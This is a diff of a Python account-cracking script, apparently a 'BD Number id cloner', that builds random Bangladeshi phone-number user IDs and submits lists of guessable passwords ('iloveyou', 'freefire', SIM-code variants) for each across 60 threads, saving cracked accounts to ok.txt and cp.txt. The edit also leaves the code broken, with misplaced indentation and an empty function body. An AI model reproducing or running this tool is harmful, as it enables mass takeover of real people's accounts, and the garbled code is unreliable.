@@ -190,35 +190,53 @@ def admin():
 def RXB ():
 	user=[]
 	os.system('clear')
-	print(logo)
-	print(" ┏━[•] BD SIM CODE 017 015 018 019 013 015 016]")
-	kode = input(' ┗━[+] SELECT : ')
-	doamin = ' BD Number id cloner [ONLY-OK] '
-	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
-	limit = int(input(' ┗━[+] LIMIT : '))
-	for nmbr in range(limit):
-		koda = ''.join(random.choice(string.digits) for _ in range(2))
-		kodb = ''.join(random.choice(string.digits) for _ in range(2))
-		nmp = ''.join(random.choice(string.digits) for _ in range(4))
-		user.append(nmp)
-	with ThreadPool(max_workers=60) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('┏━[•] COUNTRY    : Bangladesh')
-		print('┣━[•] TOTAL ID   :  '+tl)
-		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
-		print('┗━[•] START BD UID MIXT CRACKING... ')
-		print(50*'━')
-		for guru in user:
-			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+@#,@kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','freefire','iloveyou']
-			yaari.submit(b,uid,pwx,tl)
-	print(50*'_')
-	print(' [💉] Crack process has been completed')
-	print(' [💉] Ids saved in ok.txt,cp.txt')
-	print(50*'_')
-	exit()
+	import os
+import random
+import string
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+# Define the logo variable
+logo = '''
+    Your Logo Goes Here
+'''
+
+user = []  # Initialize the user list
+
+def b(uid, pwx, tl):
+    # Define the 'b' function or replace it with the appropriate function
+
+print(logo)
+print(" ┏━[•] BD SIM CODE 017 015 018 019 013 015 016]")
+kode = input(' ┗━[+] SELECT : ')
+domain = ' BD Number id cloner [ONLY-OK] '
+print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
+limit = int(input(' ┗━[+] LIMIT : '))
+
+for nmbr in range(limit):
+    koda = ''.join(random.choice(string.digits) for _ in range(2))
+    kodb = ''.join(random.choice(string.digits) for _ in range(2))
+    nmp = ''.join(random.choice(string.digits) for _ in range(4))
+    user.append(nmp)
+
+with ThreadPool(max_workers=60) as yaari:
+    os.system('clear')
+    print(logo)
+    tl = str(len(user))
+    print('┏━[•] COUNTRY    : Bangladesh')
+    print('┣━[•] TOTAL ID   :  '+tl)
+    print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
+    print('┗━[•] START BD UID MIXT CRACKING... ')
+    print(50*'━')
+    for guru in user:
+        uid = kode+koda+kodb+guru
+        pwx = [koda+kodb+guru, kodb+guru, kode+koda+kodb, kode+kode, kode+'@#', '@'+kode, kode+'123', kode+'1234', 'FREE FIRE', 'free fire', 'i love you', 'freefire', 'iloveyou']
+        yaari.submit(b, uid, pwx, tl)
+
+print(50*'_')
+print(' [💉] Crack process has been completed')
+print(' [💉] Ids saved in ok.txt,cp.txt')
+print(50*'_')
+exit()
 
 def b(uid,pwx,tl):
     global loop
